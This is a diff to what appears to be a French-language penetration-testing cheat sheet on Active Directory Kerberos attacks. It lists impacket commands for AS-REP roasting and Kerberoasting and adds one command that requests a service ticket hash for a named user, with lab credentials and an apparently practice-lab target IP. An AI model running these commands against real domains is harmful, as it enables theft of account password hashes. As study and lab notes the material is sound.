@@ -35,6 +35,7 @@ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile valid_users.txt -dc-ip 10
 # Obtenir les comptes ayant retourné un AS-REP
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -request
 
+
 # la sortie intéressante
 $krb5asrep$23$user@DOMAIN:...
 
@@ -82,6 +83,9 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
 
 ## Récupérer le ticket TGS du compte
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP -request
+
+# Récupération du hash pour un user spécifique dans un fichier précis
+impacket-GetUserSPNs delegate.vl/'A.Briggs':'P4ssw0rd1#123' -dc-ip 10.129.234.69 -request -request-user N.Thompson -outputfile N.Thompson.TGS
 ```
 
 
